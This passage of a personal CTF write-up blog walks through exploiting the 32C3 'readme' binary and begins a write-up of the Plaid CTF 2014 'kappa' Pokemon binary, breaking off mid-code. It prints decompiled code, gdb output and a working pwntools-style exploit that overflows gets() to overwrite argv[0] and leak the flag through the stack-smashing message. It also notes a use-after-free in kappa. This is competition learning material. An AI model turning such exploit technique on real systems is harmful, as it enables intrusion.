</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-128h]@1</span>
</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+108h] [bp-20h]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;Hello!</span><span class="se">\n</span><span class="s">What&#39;s your name? &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">_IO_gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v0</span> <span class="p">)</span>
</span><span class='line'><span class="nl">LABEL_9</span><span class="p">:</span>
</span><span class='line'>    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;Nice to meet you, %s.</span><span class="se">\n</span><span class="s">Please overwrite the flag: &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">v2</span> <span class="o">=</span> <span class="n">_IO_getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="n">byte_600D20</span><span class="p">[</span><span class="n">v1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
</span><span class='line'><span class="nl">LABEL_8</span><span class="p">:</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Thank you, bye!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>At first, unfortunately i had thought puts null byte leak(like codegate 2014 nuclear)but IO_gets generate \x00 in string lately
After many tries, i find out that infomation leak from &ldquo;<strong><em> stack smashing detected </em></strong>&rdquo;</p>

<figure class='code'><figcaption><span>[information leak] (readmeleak)</span> <a href='http://mashirogod.github.io/codeview/readmeleak'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">What</span><span class="c1">&#39;s your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
</span><span class='line'><span class="vg">Nice</span><span class="w"> </span><span class="vg">to</span><span class="w"> </span><span class="vg">meet</span><span class="w"> </span><span class="vg">you</span><span class="p">,</span><span class="w"> </span><span class="vg">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="o">.</span>
</span><span class='line'><span class="vg">Please</span><span class="w"> </span><span class="vg">overwrite</span><span class="w"> </span><span class="vg">the</span><span class="w"> </span><span class="nl">flag:</span><span class="w"> </span><span class="il">1</span>
</span><span class='line'><span class="vg">Thank</span><span class="w"> </span><span class="vg">you</span><span class="p">,</span><span class="w"> </span><span class="vg">bye!</span>
</span><span class='line'><span class="o">***</span><span class="w"> </span><span class="vg">stack</span><span class="w"> </span><span class="vg">smashing</span><span class="w"> </span><span class="vg">detected</span><span class="w"> </span><span class="o">***:</span><span class="w"> </span><span class="o">/</span><span class="vg">home</span><span class="o">/</span><span class="vg">pwn</span><span class="o">/</span><span class="vg">readme</span><span class="o">.</span><span class="vg">bin</span><span class="w"> </span><span class="vg">terminated</span>
</span></code></pre></td></tr></table></div></figure>


<p>above printing show argv[0] possible to overwirte. argv[0] pointer is located on $rsp+0x218</p>

<figure class='code'><figcaption><span>[argv[0]] (readmeargv)</span> <a href='http://mashirogod.github.io/codeview/readmeargv'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">gdb</span><span class="o">-</span><span class="vg">peda$</span><span class="w"> </span><span class="vg">find</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe8cc</span>
</span><span class='line'><span class="vg">Searching</span><span class="w"> </span><span class="vg">for</span><span class="w"> </span><span class="c1">&#39;0x7fffffffe8cc&#39; in: None ranges</span>
</span><span class='line'><span class="vg">Found</span><span class="w"> </span><span class="il">2</span><span class="w"> </span><span class="vg">results</span><span class="p">,</span><span class="w"> </span><span class="vg">display</span><span class="w"> </span><span class="vg">max</span><span class="w"> </span><span class="il">2</span><span class="w"> </span><span class="nl">items:</span>
</span><span class='line'><span class="w">   </span><span class="vg">libc</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="il">0</span><span class="vg">x7ffff7dd4018</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe8cc</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;/home/pwn/readme.bin&quot;</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="vg">stack</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe6b8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe8cc</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;/home/pwn/readme.bin&quot;</span><span class="p">)</span>
</span><span class='line'><span class="vg">gdb</span><span class="o">-</span><span class="vg">peda$</span><span class="w"> </span><span class="vg">print</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe6b8</span><span class="il">-0</span><span class="vg">x7fffffffe4a0</span>
</span><span class='line'><span class="err">$</span><span class="vg">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="il">0</span><span class="vg">x218</span>
</span><span class='line'><span class="vg">gdb</span><span class="o">-</span><span class="vg">peda$</span><span class="w"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>so i execute Poc</p>

<figure class='code'><figcaption><span>[POC code] (readmepoc.py)</span> <a href='http://mashirogod.github.io/codeview/readmepoc.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x218</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600D20</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;1234</span><span class="se">\n</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>[POC leak] (readmepoc2)</span> <a href='http://mashirogod.github.io/codeview/readmepoc2'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">vim</span><span class="w"> </span><span class="vg">readme</span><span class="o">.</span><span class="vg">py</span>
</span><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">python</span><span class="w"> </span><span class="vg">readme</span><span class="o">.</span><span class="vg">py</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">./</span><span class="vg">readme</span><span class="o">.</span><span class="vg">bin</span><span class="w"> </span>
</span><span class='line'><span class="vg">Hello!</span>
</span><span class='line'><span class="vg">What</span><span class="c1">&#39;s your name? Nice to meet you`.AAAAAAAAAA </span>
</span><span class='line'><span class="vg">Please</span><span class="w"> </span><span class="vg">overwrite</span><span class="w"> </span><span class="vg">the</span><span class="w"> </span><span class="nl">flag:</span><span class="w"> </span><span class="vg">Thank</span><span class="w"> </span><span class="vg">you</span><span class="p">,</span><span class="w"> </span><span class="vg">bye!</span>
</span><span class='line'><span class="o">***</span><span class="w"> </span><span class="vg">stack</span><span class="w"> </span><span class="vg">smashing</span><span class="w"> </span><span class="vg">detected</span><span class="w"> </span><span class="o">***:</span><span class="w"> </span><span class="il">1234</span><span class="w"> </span><span class="vg">terminated</span>
</span></code></pre></td></tr></table></div></figure>


<p>however, flag string is going to overwrite on second input, so i searched another flag string. fortunately,another string was exist.</p>

<p>gdb-peda$ x/s 0x400d20
0x400d20:   &ldquo;32C3_TheServerHasTheFlagHere&hellip;&rdquo;</p>

<figure class='code'><figcaption><span>[POC again] (readmepoc3)</span> <a href='http://mashirogod.github.io/codeview/readmepoc3'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">python</span><span class="w"> </span><span class="vg">readme</span><span class="o">.</span><span class="vg">py</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">./</span><span class="vg">readme</span><span class="o">.</span><span class="vg">bin</span><span class="w"> </span>
</span><span class='line'><span class="vg">Hello!</span>
</span><span class='line'><span class="vg">What</span><span class="c1">&#39;s your name? Nice to meet youspan>
</span><span class='line'><span class="vg">Please</span><span class="w"> </span><span class="vg">overwrite</span><span class="w"> </span><span class="vg">the</span><span class="w"> </span><span class="nl">flag:</span><span class="w"> </span><span class="vg">Thank</span><span class="w"> </span><span class="vg">you</span><span class="p">,</span><span class="w"> </span><span class="vg">bye!</span>
</span><span class='line'><span class="o">***</span><span class="w"> </span><span class="vg">stack</span><span class="w"> </span><span class="vg">smashing</span><span class="w"> </span><span class="vg">detected</span><span class="w"> </span><span class="o">***:</span><span class="w"> </span><span class="il">32</span><span class="vg">C3_TheServerHasTheFlagHere</span><span class="o">...</span><span class="w"> </span><span class="vg">terminated</span>
</span></code></pre></td></tr></table></div></figure>


<p>unfortunately!!!! i Can&rsquo;t show flag in remote server&hellip;.
finally i open other write up, i notice &lsquo;LIBC_FATAL_STDERR_=1&rsquo;
above the environment variable it make that show error messege on remote server</p>

<figure class='code'><figcaption><span>[memory] (readmememory)</span> <a href='http://mashirogod.github.io/codeview/readmememory'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">binary</span><span class="w"> </span><span class="vg">memory</span>
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'><span class="vg">AAAAAAAA</span>
</span><span class='line'><span class="vg">AAAAAAAA</span>
</span><span class='line'><span class="vg">AAAAAAAA</span>
</span><span class='line'><span class="o">....</span>
</span><span class='line'><span class="o">========</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">------------------</span><span class="w"> </span><span class="vg">argv</span><span class="p">[</span><span class="il">0</span><span class="p">]</span>
</span><span class='line'><span class="nl">0</span><span class="vg">x400d20</span>
</span><span class='line'><span class="o">========</span>
</span><span class='line'><span class="nl">00000000</span><span class="w"></span>
</span><span class='line'><span class="o">========</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">------------------</span><span class="w"> </span><span class="vg">environment</span><span class="w"> </span><span class="vg">variable</span>
</span><span class='line'><span class="nl">0</span><span class="vg">x600d20</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">------------</span><span class="vg">LIBC_FATAL_STDERR_</span><span class="o">=</span><span class="il">1</span>
</span><span class='line'><span class="w">       </span><span class="vg">input</span>
</span></code></pre></td></tr></table></div></figure>


<p>this is final payload</p>

<figure class='code'><figcaption><span>[final] (readmepayload.py)</span> <a href='http://mashirogod.github.io/codeview/readmepayload.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">Netcon</span><span class="p">(</span><span class="s">&#39;136.243.194.62&#39;</span><span class="p">,</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;name?&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x218</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400d20</span><span class="p">)</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600d20</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;flag:&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;LIBC_FATAL_STDERR_=1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">interact</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Plaid ctf kappa[275] in 2014]]></title>
    <link href="http://mashirogod.github.io/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/"/>
    <updated>2015-12-26T01:13:36-08:00</updated>
    <id>http://mashirogod.github.io/blog/2015/12/26/plaid-ctf-kappa-275-in-2014</id>
    <content type="html"><![CDATA[<p>i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s start breaking kappa</p>

<p>Kappa is Pokemon Game binary</p>

<figure class='code'><figcaption><span>[Kappa Menu] (kappaMenu.c)</span> <a href='http://mashirogod.github.io/codeview/kappaMenu.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sub_80491F6</span><span class="p">();</span>
</span><span class='line'>  <span class="n">sub_80486DC</span><span class="p">();</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">switch</span> <span class="p">(</span> <span class="n">sub_804886E</span><span class="p">()</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
</span><span class='line'>        <span class="n">sub_8048DE3</span><span class="p">();</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span><span class='line'>        <span class="n">sub_8048F56</span><span class="p">();</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span><span class='line'>        <span class="n">vuln_execute</span><span class="p">();</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span><span class='line'>        <span class="n">advice</span><span class="p">();</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span><span class='line'>        <span class="n">vulne_exploit</span><span class="p">();</span>
</span><span class='line'>        <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="k">default</span><span class="o">:</span>
</span><span class='line'>        <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>there are 1-5 select that can choose. opening binary with IDA pro, i could see select function and Battle function.</p>

<figure class='code'><figcaption><span>[Choose 1] (KappaChoose1.c)</span> <a href='http://mashirogod.github.io/codeview/KappaChoose1.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">sub_8048DE3</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;You walk into the tall grass!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;.&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">dword_804BFA8</span> <span class="o">%</span> <span class="mi">13</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">dword_804BFA8</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;You failed to find any Pokemon!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">sub_8048C59</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">sub_8048C59</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>first select function is Battle system with wild Pokemon
it is algorithm that encounter pokemon with &lsquo;an&rsquo; sequence(0: fail, 1: Kakuna, 2: charizar)
[a1 = 0, a2 = 1, a3 = 0, a4 = 1, a5 = 0 &hellip;&hellip; a13 = 2]</p>

<p>wild Pokemon is producted with other function. this function product struct using malloc.
this method can become vulnerability on UAF. for now, i perceived it vulnerabilty</p>

<figure class='code'><figcaption><span>[wild Pokemon struct] (kappawild.c)</span> <a href='http://mashirogod.github.io/codeview/kappawild.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">sub_8048C59</span><span class="p">(</span><span class="kt">int</span> <span class="n">type</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">struct_ptr</span> <span class="o">*</span><span class="n">Pokemon1</span><span class="p">;</span> <span class="c1">// ST2C_4@2</span>
</span><span class='line'>  <span class="n">struct_buf</span> <span class="o">*</span><span class="n">Pokemon2</span><span class="p">;</span> <span class="c1">// ST28_4@4</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">type</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">Pokemon1</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct_ptr</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x888u</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">rahC</span><span class="err">&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">name_</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">razi</span><span class="err">&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">name__</span> <span class="o">=</span> <span class="sc">&#39;d&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">art</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">dword880</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">off_804BF78</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">HP</span><span class="o">?</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">dword87C</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
